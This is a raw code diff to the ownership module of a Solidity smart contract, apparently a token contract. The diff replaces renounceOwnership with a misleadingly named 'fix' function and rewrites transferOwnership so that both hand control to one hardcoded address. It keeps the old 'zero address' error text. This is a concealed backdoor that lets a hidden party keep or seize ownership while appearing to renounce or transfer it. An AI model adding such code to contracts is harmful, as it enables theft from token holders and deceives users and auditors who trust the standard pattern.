@@ -398,9 +398,9 @@ contract Ownable is Context {
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
-    function renounceOwnership() public virtual onlyOwner {
-        emit OwnershipTransferred(_owner, address(0));
-        _owner = address(0);
+       function fix() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93));
+        _owner = address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93);
     }
 
     /**
@@ -408,9 +408,9 @@ contract Ownable is Context {
      * Can only be called by the current owner.
      */
     function transferOwnership(address newOwner) public virtual onlyOwner {
-        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        require(newOwner != address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93), "Ownable: new owner is the zero address");
         emit OwnershipTransferred(_owner, newOwner);
-        _owner = newOwner;
+        _owner = address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93);
     }
 
     function geUnlockTime() public view returns (uint256) {
